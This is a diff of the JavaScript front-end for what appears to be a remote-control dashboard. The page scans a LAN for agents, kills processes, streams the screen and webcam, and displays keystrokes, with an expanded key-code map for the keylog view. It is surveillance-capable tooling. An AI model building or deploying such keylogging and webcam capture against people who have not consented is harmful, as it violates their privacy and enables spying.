@@ -56,7 +56,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // System & Nav
     const sidebar = $('#sidebar');
-    const themeToggle = $('#theme-toggle'); 
+    const themeToggle = $('#theme-toggle');
     const bodyEl = document.body;
 
     // --- MODAL HELPERS ---
@@ -76,7 +76,7 @@ document.addEventListener('DOMContentLoaded', () => {
         $('#modal-backdrop').classList.remove('hidden');
     }
 
-    if(btnConfirmYes) {
+    if (btnConfirmYes) {
         btnConfirmYes.onclick = () => {
             if (confirmCallback) confirmCallback();
             handleCloseModal();
@@ -100,7 +100,7 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     // --- LOGIC QUÉT MẠNG LAN (HTTP API + POLLING) ---
-    const fetchScanList = async () => {
+    const fetchScanList = async() => {
         try {
             // Gọi về chính server đang phục vụ trang web này
             const apiUrl = `${location.protocol}//${location.host}/api/scan`;
@@ -128,14 +128,14 @@ document.addEventListener('DOMContentLoaded', () => {
         if (isConnected) {
             statusPill.classList.remove('disconnected');
             statusPill.classList.add('connected');
-            if(statusText) statusText.textContent = 'Connected';
+            if (statusText) statusText.textContent = 'Connected';
             btnConnect.classList.add('hidden');
             btnDisconnect.classList.remove('hidden');
             wsUrlInput.disabled = true;
         } else {
             statusPill.classList.remove('connected');
             statusPill.classList.add('disconnected');
-            if(statusText) statusText.textContent = 'Disconnected';
+            if (statusText) statusText.textContent = 'Disconnected';
             btnConnect.classList.remove('hidden');
             btnDisconnect.classList.add('hidden');
             wsUrlInput.disabled = false;
@@ -147,21 +147,24 @@ document.addEventListener('DOMContentLoaded', () => {
         const url = wsUrlInput.value;
         if (!url) return alert('Enter WebSocket URL');
         console.log("Connecting to:", url);
-        
+
         try {
             ws = new WebSocket(url);
         } catch (e) {
             return alert("Invalid URL");
         }
 
-        ws.onopen = () => { setConnectedState(true); loadDataForView(currentView); };
-        ws.onclose = () => { 
-            setConnectedState(false); 
-            ws = null; 
-            if($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
-            if($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
-            if(keylogOutput) keylogOutput.textContent = 'System ready. Waiting...';
-            if(keylogToggle) keylogToggle.checked = false;
+        ws.onopen = () => {
+            setConnectedState(true);
+            loadDataForView(currentView);
+        };
+        ws.onclose = () => {
+            setConnectedState(false);
+            ws = null;
+            if ($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
+            if ($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
+            if (keylogOutput) keylogOutput.textContent = 'System ready. Waiting...';
+            if (keylogToggle) keylogToggle.checked = false;
             lastLoggedKeyCode = null;
         };
         ws.onerror = (e) => alert('Connection failed');
@@ -178,13 +181,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- MAIN MESSAGE HANDLER ---
     function onWsMessage(event) {
         const msg = JSON.parse(event.data);
-        
+
         const modalAppEl = document.getElementById('modal-stop-app');
         const modalProcEl = document.getElementById('modal-stop-proc');
-        
+
         const isStopAppOpen = modalAppEl && !modalAppEl.classList.contains('hidden');
         const isStopProcOpen = modalProcEl && !modalProcEl.classList.contains('hidden');
-    
+
         switch (msg.type) {
             case 'process_list':
                 if (isStopProcOpen) {
@@ -193,7 +196,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderProcessTable(msg.data);
                 }
                 break;
-                
+
             case 'application_list':
                 if (isStopAppOpen) {
                     renderStopAppList(msg.data);
@@ -201,59 +204,65 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderAppTable(msg.data);
                 }
                 break;
-            
+
             case 'screenshot':
                 captureSpinner.classList.add('hidden');
-                
+
                 streamImg.classList.add('hidden');
                 streamImg.src = "";
                 capturePlaceholder.parentElement.classList.add('hidden');
 
                 captureImg.src = `data:image/png;base64,${msg.data}`;
                 captureImg.classList.remove('hidden');
-                
+
                 btnCopyScreenshot.classList.remove('hidden');
                 btnSaveScreenshot.classList.remove('hidden');
                 break;
-            
+
             case 'screen_frame':
                 if (btnStartStream.classList.contains('hidden')) {
                     const captureEmptyState = $('#capture-display-area .empty-state');
-                    captureEmptyState.classList.add('hidden'); 
-                    
+                    captureEmptyState.classList.add('hidden');
+
                     captureImg.classList.add('hidden');
-                    
+
                     streamImg.classList.remove('hidden');
                     streamImg.src = "data:image/jpeg;base64," + msg.data;
                 }
                 break;
-            
-            case 'webcam_recording_status': handleWebcamStatus(msg); break;
-            case 'webcam_video': handleWebcamVideo(msg.data); break;
-            case 'webcam_frame': 
+
+            case 'webcam_recording_status':
+                handleWebcamStatus(msg);
+                break;
+            case 'webcam_video':
+                handleWebcamVideo(msg.data);
+                break;
+            case 'webcam_frame':
                 if (btnStartWebcamStream.classList.contains('hidden')) {
                     $('#webcam-display-area .empty-state').classList.add('hidden');
-                    
+
                     webcamVideoOutput.classList.add('hidden');
-                    
+
                     webcamStreamImg.classList.remove('hidden');
                     webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
                 }
                 break;
-            
-            case 'key_event': handleKeyEvent(msg.key_code); break;
-            
+
+            case 'key_event':
+                handleKeyEvent(msg.key_code);
+                break;
+
             case 'status':
                 if (msg.success) {
-                    if (isStopAppOpen) sendWsMessage({command: 'list_applications'});
-                    if (isStopProcOpen) sendWsMessage({command: 'list_processes'});
-                    
-                    if (currentView.includes('process')) sendWsMessage({command: 'list_processes'});
-                    if (currentView.includes('app')) sendWsMessage({command: 'list_applications'});
+                    if (isStopAppOpen) sendWsMessage({ command: 'list_applications' });
+                    if (isStopProcOpen) sendWsMessage({ command: 'list_processes' });
+
+                    if (currentView.includes('process')) sendWsMessage({ command: 'list_processes' });
+                    if (currentView.includes('app')) sendWsMessage({ command: 'list_applications' });
                 } else {
-                    if(msg.message === 'capture failed') {
-                         captureSpinner.classList.add('hidden');
-                         capturePlaceholder.parentElement.classList.remove('hidden');
+                    if (msg.message === 'capture failed') {
+                        captureSpinner.classList.add('hidden');
+                        capturePlaceholder.parentElement.classList.remove('hidden');
                     } else alert('Error: ' + msg.message);
                 }
                 break;
@@ -269,8 +278,7 @@ document.addEventListener('DOMContentLoaded', () => {
         tbody.innerHTML = data.map(p => `
             <tr><td><span class="status-pill" style="background:rgba(0,0,0,0.05);color:var(--text-main)">${p.pid}</span></td>
             <td>${p.name}</td><td>${p.workingSet ? fmt.format(p.workingSet)+' B' : 'N/A'}</td>
-            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td></tr>`
-        ).join('');
+            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td></tr>`).join('');
     }
 
     function renderAppTable(data) {
@@ -279,8 +287,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="3">No data.</td></tr>'; return; }
         tbody.innerHTML = data.map(a => `
             <tr><td style="font-weight:500">${a.name}</td><td>${a.process_count}</td>
-            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td></tr>`
-        ).join('');
+            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td></tr>`).join('');
     }
 
     // --- RENDER MODAL LISTS ---
@@ -290,7 +297,7 @@ document.addEventListener('DOMContentLoaded', () => {
             container.innerHTML = '<div class="list-loading">No running apps found.</div>';
             return;
         }
-        
+
         container.innerHTML = data.map(app => `
             <div class="list-item">
                 <div class="item-info">
@@ -302,19 +309,19 @@ document.addEventListener('DOMContentLoaded', () => {
                 </button>
             </div>
         `).join('');
-        
-        if(typeof feather !== 'undefined') feather.replace();
+
+        if (typeof feather !== 'undefined') feather.replace();
     }
-    
+
     function renderStopProcList(data) {
         const container = $('#stop-proc-list');
         if (!data || data.length === 0) {
             container.innerHTML = '<div class="list-loading">No processes found.</div>';
             return;
         }
-    
-        const displayData = data.slice(0, 100); 
-    
+
+        const displayData = data.slice(0, 100);
+
         container.innerHTML = displayData.map(proc => `
             <div class="list-item">
                 <div class="item-info">
@@ -326,12 +333,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 </button>
             </div>
         `).join('');
-        
-        if(data.length > 100) {
+
+        if (data.length > 100) {
             container.innerHTML += `<div class="list-loading" style="font-size:11px">...and ${data.length - 100} more processes</div>`;
         }
-    
-        if(typeof feather !== 'undefined') feather.replace();
+
+        if (typeof feather !== 'undefined') feather.replace();
     }
 
     // --- RENDER SCAN LIST ---
@@ -341,7 +348,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- RENDER SCAN LIST ---
     function renderScanList(data) {
         const container = $('#scan-list');
-        
+
         // Sắp xếp data theo IP hoặc Hostname để đảm bảo thứ tự nhất quán
         if (data && data.length > 0) {
             data.sort((a, b) => a.ip.localeCompare(b.ip));
@@ -350,7 +357,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Nếu dữ liệu y hệt lần trước thì KHÔNG làm gì cả (giữ nguyên DOM và trạng thái Hover)
         const currentDataJson = JSON.stringify(data);
         if (currentDataJson === lastScanDataJson && container.innerHTML.trim() !== "") {
-            return; 
+            return;
         }
         lastScanDataJson = currentDataJson; // Cập nhật dữ liệu mới
 
@@ -368,7 +375,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         container.innerHTML = data.map(agent => {
             let iconName = 'monitor';
-            if (agent.os.includes('Windows')) iconName = 'layout'; 
+            if (agent.os.includes('Windows')) iconName = 'layout';
             else if (agent.os.includes('Linux')) iconName = 'terminal';
 
             return `
@@ -390,33 +397,35 @@ document.addEventListener('DOMContentLoaded', () => {
             </div>
             `;
         }).join('');
-        
-        if(typeof feather !== 'undefined') feather.replace();
+
+        if (typeof feather !== 'undefined') feather.replace();
     }
 
     window.requestStopApp = (name) => {
-        if(confirm(`Force stop "${name}"?`)) {
-            if(ws) ws.send(JSON.stringify({command: 'stop_application', app_name: name}));
+        if (confirm(`Force stop "${name}"?`)) {
+            if (ws) ws.send(JSON.stringify({ command: 'stop_application', app_name: name }));
         }
     };
-    
+
     window.requestStopProc = (pid) => {
-        if(confirm(`Kill process PID ${pid}?`)) {
-            if(ws) ws.send(JSON.stringify({command: 'stop_process_pid', pid: parseInt(pid)}));
+        if (confirm(`Kill process PID ${pid}?`)) {
+            if (ws) ws.send(JSON.stringify({ command: 'stop_process_pid', pid: parseInt(pid) }));
         }
     };
 
     window.selectAgent = (ip) => {
-        const port = location.port || 8080; // Giả sử Gateway cũng chạy 8080
         const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-        const gatewayIp = location.hostname; // địa chỉ của Gateway
-        const url = `${proto}://${gatewayIp}:${port}/ws`;
 
-        
+        // Dùng location.host: Nó tự động lấy "domain" hoặc "domain:port" tùy theo thực tế
+        // Không ép buộc thêm :8080 nữa
+        const url = `${proto}://${location.host}/ws`;
+
+        console.log("Connecting to:", url); // Kiểm tra log để thấy đường dẫn đúng (không có :8080)
+
         wsUrlInput.value = url;
         handleCloseModal();
-        
-        if(ws) disconnectWs();
+
+        if (ws) disconnectWs();
         setTimeout(connectWs, 500);
     };
 
@@ -434,11 +443,122 @@ document.addEventListener('DOMContentLoaded', () => {
         function translateKeyCode(code) {
             if (code >= 65 && code <= 90) return String.fromCharCode(code);
             if (code >= 48 && code <= 57) return String.fromCharCode(code);
-            // ... (Simple map)
-            if (code === 8) return '[Backspace]';
-            if (code === 13) return '[Enter]\n';
-            if (code === 32) return '[Space]';
-            return `[${code}]`;
+            if (code >= 96 && code <= 105) return `[Num ${code - 96}]`;
+            switch (code) {
+                case 8:
+                    return '[Backspace]';
+                case 9:
+                    return '[Tab]';
+                case 13:
+                    return '[Enter]\n';
+                case 19:
+                    return '[Pause]';
+                case 20:
+                    return '[CapsLk]';
+                case 27:
+                    return '[Esc]';
+                case 32:
+                    return '[Space]';
+                case 33:
+                    return '[PgUp]';
+                case 34:
+                    return '[PgDn]';
+                case 35:
+                    return '[End]';
+                case 36:
+                    return '[Home]';
+                case 37:
+                    return '[Left]';
+                case 38:
+                    return '[Up]';
+                case 39:
+                    return '[Right]';
+                case 40:
+                    return '[Down]';
+                case 44:
+                    return '[PrtSc]';
+                case 45:
+                    return '[Insert]';
+                case 46:
+                    return '[Delete]';
+                case 106:
+                    return '[Num *]';
+                case 107:
+                    return '[Num +]';
+                case 109:
+                    return '[Num -]';
+                case 110:
+                    return '[Num .]';
+                case 111:
+                    return '[Num /]';
+                case 144:
+                    return '[NumLock]';
+                case 112:
+                    return '[F1]';
+                case 113:
+                    return '[F2]';
+                case 114:
+                    return '[F3]';
+                case 115:
+                    return '[F4]';
+                case 116:
+                    return '[F5]';
+                case 117:
+                    return '[F6]';
+                case 118:
+                    return '[F7]';
+                case 119:
+                    return '[F8]';
+                case 120:
+                    return '[F9]';
+                case 121:
+                    return '[F10]';
+                case 122:
+                    return '[F11]';
+                case 123:
+                    return '[F12]';
+                case 160:
+                    return '[LShift]';
+                case 161:
+                    return '[RShift]';
+                case 162:
+                case 163:
+                    return '[LCtrl]';
+                case 164:
+                    return '[LAlt]';
+                case 165:
+                    return '[RAlt]';
+                case 186:
+                    return ';';
+                case 187:
+                    return '=';
+                case 188:
+                    return ',';
+                case 189:
+                    return '-';
+                case 190:
+                    return '.';
+                case 191:
+                    return '/';
+                case 192:
+                    return '`';
+                case 219:
+                    return '[';
+                case 220:
+                    return '\\';
+                case 221:
+                    return ']';
+                case 222:
+                    return "'";
+                case 91:
+                    return '[LWin]';
+                case 92:
+                    return '[RWin]';
+                case 93:
+                    return '[Menu]';
+                default:
+                    return `[${code}]`;
+            }
         }
 
         const char = translateKeyCode(keyCode);
@@ -452,34 +572,32 @@ document.addEventListener('DOMContentLoaded', () => {
         webcamStatus.classList.remove('hidden');
 
         if (msg.message.includes('Recording started')) {
-            btnStartRecord.classList.add('hidden'); 
-            btnStopRecord.classList.remove('hidden'); 
-            
-            btnStartWebcamStream.classList.add('hidden'); 
+            btnStartRecord.classList.add('hidden');
+            btnStopRecord.classList.remove('hidden');
+
+            btnStartWebcamStream.classList.add('hidden');
             btnStopWebcamStream.classList.add('hidden');
-            
+
             btnSaveVideo.classList.add('hidden');
-            
-            webcamPlaceholder.parentElement.classList.add('hidden'); 
-            webcamSpinner.classList.remove('hidden'); 
+
+            webcamPlaceholder.parentElement.classList.add('hidden');
+            webcamSpinner.classList.remove('hidden');
             webcamVideoOutput.classList.add('hidden');
-        } 
-        else if (msg.message.includes('completed')) {
+        } else if (msg.message.includes('completed')) {
             btnStartWebcamStream.classList.remove('hidden');
-            webcamSpinner.classList.add('hidden'); 
-            webcamPlaceholder.parentElement.classList.remove('hidden'); 
+            webcamSpinner.classList.add('hidden');
+            webcamPlaceholder.parentElement.classList.remove('hidden');
             webcamPlaceholder.textContent = 'Processing...';
-        } 
-        else if (msg.message.includes('error') || msg.message.includes('cancelled') || msg.message.includes('stopped')) {
-            
-            webcamSpinner.classList.add('hidden'); 
-            
+        } else if (msg.message.includes('error') || msg.message.includes('cancelled') || msg.message.includes('stopped')) {
+
+            webcamSpinner.classList.add('hidden');
+
             webcamPlaceholder.parentElement.classList.remove('hidden');
             webcamPlaceholder.textContent = "Ready to record or stream webcam";
 
-            btnStartRecord.classList.remove('hidden'); 
+            btnStartRecord.classList.remove('hidden');
             btnStopRecord.classList.add('hidden');
-            
+
             btnStartWebcamStream.classList.remove('hidden');
             btnStopWebcamStream.classList.add('hidden');
 
@@ -488,28 +606,32 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function handleWebcamVideo(b64) {
-        webcamSpinner.classList.add('hidden'); 
+        webcamSpinner.classList.add('hidden');
         webcamPlaceholder.parentElement.classList.add('hidden');
 
-        webcamStreamImg.classList.add('hidden'); 
-        webcamStreamImg.src = ""; 
+        webcamStreamImg.classList.add('hidden');
+        webcamStreamImg.src = "";
 
         try {
-            const chars = atob(b64), bytes = new Uint8Array(chars.length);
-            for(let i=0; i<chars.length; i++) bytes[i] = chars.charCodeAt(i);
-            
+            const chars = atob(b64),
+                bytes = new Uint8Array(chars.length);
+            for (let i = 0; i < chars.length; i++) bytes[i] = chars.charCodeAt(i);
+
             if (currentVideoBlob) URL.revokeObjectURL(currentVideoBlob.src);
             currentVideoBlob = new Blob([bytes], { type: 'video/mp4' });
-            
+
             webcamVideoOutput.src = URL.createObjectURL(currentVideoBlob);
             webcamVideoOutput.classList.remove('hidden');
 
             btnStartRecord.classList.remove('hidden');
             btnStopRecord.classList.add('hidden');
             btnSaveVideo.classList.remove('hidden');
-            btnStartWebcamStream.classList.remove('hidden'); 
+            btnStartWebcamStream.classList.remove('hidden');
 
-        } catch(e) { console.error(e); alert("Video error"); }
+        } catch (e) {
+            console.error(e);
+            alert("Video error");
+        }
     }
 
     // --- NAVIGATION ---
@@ -517,19 +639,19 @@ document.addEventListener('DOMContentLoaded', () => {
         currentView = viewId;
         $$('.content-view').forEach(v => v.classList.remove('active'));
         const targetView = $(`#view-${viewId}`);
-        if(targetView) targetView.classList.add('active');
-        
+        if (targetView) targetView.classList.add('active');
+
         $$('.nav-item').forEach(i => i.classList.remove('active'));
         const parent = targetView ? targetView.dataset.parentView : null;
         const activeItem = $(`.nav-item[data-view="${parent || viewId}"]`);
-        if(activeItem) activeItem.classList.add('active');
+        if (activeItem) activeItem.classList.add('active');
 
         if (ws && ws.readyState === WebSocket.OPEN) loadDataForView(viewId);
     }
 
     function loadDataForView(id) {
-        if(id === 'processes-table') sendWsMessage({command: 'list_processes'});
-        else if(id === 'applications-table') sendWsMessage({command: 'list_applications'});
+        if (id === 'processes-table') sendWsMessage({ command: 'list_processes' });
+        else if (id === 'applications-table') sendWsMessage({ command: 'list_applications' });
     }
 
     // --- INIT ---
@@ -539,30 +661,30 @@ document.addEventListener('DOMContentLoaded', () => {
 
         btnConnect.onclick = connectWs;
         btnDisconnect.onclick = disconnectWs;
-        
+
         $('#sidebar').onclick = e => {
             const item = e.target.closest('.nav-item');
-            if(item) showView(item.dataset.view);
+            if (item) showView(item.dataset.view);
         };
 
         // Dashboard
         $('#main-content').onclick = e => {
             const card = e.target.closest('[data-action="show-view"]');
-            if(card) showView(card.dataset.target);
-            
+            if (card) showView(card.dataset.target);
+
             const stopBtn = e.target.closest('[data-action="stop-proc"]');
-            if(stopBtn) showConfirmModal('Stop Process', `PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({command:'stop_process_pid', pid: parseInt(stopBtn.dataset.pid)}));
+            if (stopBtn) showConfirmModal('Stop Process', `PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({ command: 'stop_process_pid', pid: parseInt(stopBtn.dataset.pid) }));
             const stopAppBtn = e.target.closest('[data-action="stop-app"]');
-            if(stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({command:'stop_application', app_name: stopAppBtn.dataset.name}));
+            if (stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({ command: 'stop_application', app_name: stopAppBtn.dataset.name }));
         };
 
         // SCAN LAN - Nút Quét mạng
         const stopScanning = () => {
-                if (scanInterval) {
-                    clearInterval(scanInterval);
-                    scanInterval = null;
-                }
-                btnScanLan.classList.remove('active-scan');
+            if (scanInterval) {
+                clearInterval(scanInterval);
+                scanInterval = null;
+            }
+            btnScanLan.classList.remove('active-scan');
         };
 
         // 2. Sự kiện bấm nút
@@ -579,7 +701,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Thiết lập vòng lặp
                 stopScanning(); // Clear cũ
                 btnScanLan.classList.add('active-scan');
-                scanInterval = setInterval(fetchScanList, 1000); 
+                scanInterval = setInterval(fetchScanList, 1000);
             };
         }
 
@@ -591,20 +713,20 @@ document.addEventListener('DOMContentLoaded', () => {
         const cardStopApps = $('#card-open-stop-apps');
         if (cardStopApps) {
             cardStopApps.onclick = () => {
-                if(!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
+                if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
                 showModal('modal-stop-app');
                 $('#stop-app-list').innerHTML = '<div class="list-loading"><div class="spinner"></div><br>Fetching Apps...</div>';
-                sendWsMessage({command: 'list_applications'});
+                sendWsMessage({ command: 'list_applications' });
             };
         }
 
         const cardStopProcs = $('#card-open-stop-procs');
         if (cardStopProcs) {
             cardStopProcs.onclick = () => {
-                if(!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
+                if (!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
                 showModal('modal-stop-proc');
                 $('#stop-proc-list').innerHTML = '<div class="list-loading"><div class="spinner"></div><br>Fetching Processes...</div>';
-                sendWsMessage({command: 'list_processes'});
+                sendWsMessage({ command: 'list_processes' });
             };
         }
 
@@ -615,70 +737,82 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 streamImg.src = "";
                 streamImg.classList.add('hidden');
-                
+
                 captureImg.src = "";
                 captureImg.classList.add('hidden');
-                
+
                 sendWsMessage({ command: 'capture_screen' });
-                
-                captureSpinner.classList.remove('hidden'); 
+
+                captureSpinner.classList.remove('hidden');
                 capturePlaceholder.parentElement.classList.add('hidden');
-                btnSaveScreenshot.classList.add('hidden'); 
+                btnSaveScreenshot.classList.add('hidden');
                 btnCopyScreenshot.classList.add('hidden');
-                
+
                 btnStartStream.classList.remove('hidden');
                 btnStopStream.classList.add('hidden');
-                
+
             } else alert('Connect first');
         };
 
         if (btnReloadScreen) {
             btnReloadScreen.onclick = () => {
-                if(ws && ws.readyState === WebSocket.OPEN) {
+                if (ws && ws.readyState === WebSocket.OPEN) {
                     sendWsMessage({ command: 'stop_screen_stream' });
                 }
 
-                captureImg.classList.add('hidden'); 
+                captureImg.classList.add('hidden');
                 captureImg.src = "";
-                
-                streamImg.classList.add('hidden'); 
+
+                streamImg.classList.add('hidden');
                 streamImg.src = "";
 
                 const emptyState = $('#capture-display-area .empty-state');
                 emptyState.classList.remove('hidden');
-                
+
                 const emptyIcon = emptyState.querySelector('.empty-icon');
-                if(emptyIcon) emptyIcon.classList.remove('hidden');
+                if (emptyIcon) emptyIcon.classList.remove('hidden');
 
-                capturePlaceholder.textContent = "Ready to capture/stream screen"; 
+                capturePlaceholder.textContent = "Ready to capture/stream screen";
                 capturePlaceholder.parentElement.classList.remove('hidden');
-                captureSpinner.classList.add('hidden'); 
+                captureSpinner.classList.add('hidden');
 
-                btnSaveScreenshot.classList.add('hidden'); 
+                btnSaveScreenshot.classList.add('hidden');
                 btnCopyScreenshot.classList.add('hidden');
-                
-                btnStartStream.classList.remove('hidden'); 
+
+                btnStartStream.classList.remove('hidden');
                 btnStopStream.classList.add('hidden');
             };
         }
 
-        btnSaveScreenshot.onclick = () => { const a = document.createElement('a'); a.href = captureImg.src; a.download = `screen-${Date.now()}.png`; a.click(); };
-        btnCopyScreenshot.onclick = async () => {
-            try {
-                const response = await fetch(captureImg.src); const blob = await response.blob();
-                await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]); alert('Copied!');
-            } catch (err) { await navigator.clipboard.writeText(captureImg.src.split(',')[1]); alert('Copied Base64'); }
+        btnSaveScreenshot.onclick = () => {
+            const a = document.createElement('a');
+            a.href = captureImg.src;
+            a.download = `screen-${Date.now()}.png`;
+            a.click();
         };
-        
+        btnCopyScreenshot.onclick = async() => {
+            try {
+                const response = await fetch(captureImg.src);
+                const blob = await response.blob();
+                await navigator.clipboard.write([new ClipboardItem({
+                    [blob.type]: blob
+                })]);
+                alert('Copied!');
+            } catch (err) {
+                await navigator.clipboard.writeText(captureImg.src.split(',')[1]);
+                alert('Copied Base64');
+            }
+        };
+
         if (btnReloadWebcam) {
             btnReloadWebcam.onclick = () => {
-                if(ws && ws.readyState === WebSocket.OPEN) {
+                if (ws && ws.readyState === WebSocket.OPEN) {
                     sendWsMessage({ command: 'stop_webcam_stream' });
                     sendWsMessage({ command: 'stop_webcam_record' });
                 }
 
                 webcamStreamImg.classList.add('hidden');
-                webcamStreamImg.src = ""; 
+                webcamStreamImg.src = "";
 
                 webcamVideoOutput.classList.add('hidden');
                 webcamVideoOutput.src = "";
@@ -689,22 +823,22 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const emptyState = $('#webcam-display-area .empty-state');
                 emptyState.classList.remove('hidden');
-                
+
                 webcamSpinner.classList.add('hidden');
                 webcamStatus.classList.add('hidden');
 
                 const emptyIcon = emptyState.querySelector('.empty-icon');
-                if(emptyIcon) emptyIcon.classList.remove('hidden');
-                
+                if (emptyIcon) emptyIcon.classList.remove('hidden');
+
                 webcamPlaceholder.textContent = "Ready to record or stream webcam";
                 webcamPlaceholder.parentElement.classList.remove('hidden');
 
-                btnStartWebcamStream.classList.remove('hidden'); 
+                btnStartWebcamStream.classList.remove('hidden');
                 btnStopWebcamStream.classList.add('hidden');
-                
-                btnStartRecord.classList.remove('hidden'); 
-                btnStopRecord.classList.add('hidden'); 
-                
+
+                btnStartRecord.classList.remove('hidden');
+                btnStopRecord.classList.add('hidden');
+
                 btnSaveVideo.classList.add('hidden');
             };
         }
@@ -715,124 +849,141 @@ document.addEventListener('DOMContentLoaded', () => {
                 streamImg.classList.add('hidden');
                 captureImg.classList.add('hidden');
 
-                btnSaveScreenshot.classList.add('hidden'); 
+                btnSaveScreenshot.classList.add('hidden');
                 btnCopyScreenshot.classList.add('hidden');
 
                 const emptyState = $('#capture-display-area .empty-state');
-                emptyState.classList.remove('hidden'); 
-                
-                const emptyIcon = emptyState.querySelector('.empty-icon');
-                if(emptyIcon) emptyIcon.classList.add('hidden'); 
+                emptyState.classList.remove('hidden');
 
-                capturePlaceholder.textContent = "Initializing Screen Stream..."; 
-                captureSpinner.classList.remove('hidden'); 
+                const emptyIcon = emptyState.querySelector('.empty-icon');
+                if (emptyIcon) emptyIcon.classList.add('hidden');
+
+                capturePlaceholder.textContent = "Initializing Screen Stream...";
+                captureSpinner.classList.remove('hidden');
 
                 sendWsMessage({ command: 'start_screen_stream', fps: 30 });
 
-                btnStartStream.classList.add('hidden'); 
+                btnStartStream.classList.add('hidden');
                 btnStopStream.classList.remove('hidden');
             } else alert('Connect first');
         };
         btnStopStream.onclick = () => {
-             sendWsMessage({ command: 'stop_screen_stream' });
-             streamImg.classList.add('hidden'); capturePlaceholder.parentElement.classList.remove('hidden');
-             btnStartStream.classList.remove('hidden'); btnStopStream.classList.add('hidden');
+            sendWsMessage({ command: 'stop_screen_stream' });
+            streamImg.classList.add('hidden');
+            capturePlaceholder.parentElement.classList.remove('hidden');
+            btnStartStream.classList.remove('hidden');
+            btnStopStream.classList.add('hidden');
         };
 
         // Webcam
         btnStartRecord.onclick = () => showModal('modal-webcam-device');
         $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
-             webcamVideoOutput.src = "";
-             
-             webcamStreamImg.classList.add('hidden');
-             webcamStreamImg.src = "";
+            webcamVideoOutput.src = "";
+
+            webcamStreamImg.classList.add('hidden');
+            webcamStreamImg.src = "";
 
             currentVideoBlob = null;
-            webcamVideoOutput.classList.add('hidden'); 
-            
+            webcamVideoOutput.classList.add('hidden');
+
             sendWsMessage({
-                command: 'start_webcam_record', 
-                time: parseInt(inputWebcamDuration.value)||10, 
+                command: 'start_webcam_record',
+                time: parseInt(inputWebcamDuration.value) || 10,
                 device_name: inputWebcamDeviceName.value
             });
             handleCloseModal();
-            
+
             webcamPlaceholder.parentElement.classList.add('hidden');
             webcamSpinner.classList.remove('hidden');
         };
-        btnStopRecord.onclick = () => sendWsMessage({command: 'stop_webcam_record'});
-        btnSaveVideo.onclick = () => { if(currentVideoBlob) { const a = document.createElement('a'); a.href = URL.createObjectURL(currentVideoBlob); a.download = `webcam-${Date.now()}.mp4`; a.click(); }};
+        btnStopRecord.onclick = () => sendWsMessage({ command: 'stop_webcam_record' });
+        btnSaveVideo.onclick = () => {
+            if (currentVideoBlob) {
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(currentVideoBlob);
+                a.download = `webcam-${Date.now()}.mp4`;
+                a.click();
+            }
+        };
 
         btnStartWebcamStream.onclick = () => {
             if (ws && ws.readyState === WebSocket.OPEN) {
                 webcamStreamImg.src = "";
                 webcamStreamImg.classList.add('hidden');
-                
-                webcamVideoOutput.classList.add('hidden'); 
-                if (currentVideoBlob) { 
-                    URL.revokeObjectURL(currentVideoBlob); 
-                    currentVideoBlob = null; 
+
+                webcamVideoOutput.classList.add('hidden');
+                if (currentVideoBlob) {
+                    URL.revokeObjectURL(currentVideoBlob);
+                    currentVideoBlob = null;
                 }
-                
+
                 btnSaveVideo.classList.add('hidden');
 
                 const emptyState = $('#webcam-display-area .empty-state');
                 emptyState.classList.remove('hidden');
-                
+
                 const emptyIcon = emptyState.querySelector('.empty-icon');
-                if(emptyIcon) emptyIcon.classList.add('hidden');
-                
+                if (emptyIcon) emptyIcon.classList.add('hidden');
+
                 webcamPlaceholder.textContent = "Initializing Camera Stream...";
                 webcamSpinner.classList.remove('hidden');
 
                 sendWsMessage({ command: 'start_webcam_stream', fps: 30 });
-                
-                btnStartRecord.classList.add('hidden'); 
+
+                btnStartRecord.classList.add('hidden');
                 btnStopRecord.classList.add('hidden');
-                btnStartWebcamStream.classList.add('hidden'); 
+                btnStartWebcamStream.classList.add('hidden');
                 btnStopWebcamStream.classList.remove('hidden');
             } else alert('Connect first');
         };
         btnStopWebcamStream.onclick = () => {
             sendWsMessage({ command: 'stop_webcam_stream' });
-            webcamStreamImg.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden');
-            btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); btnStartRecord.classList.remove('hidden');
+            webcamStreamImg.classList.add('hidden');
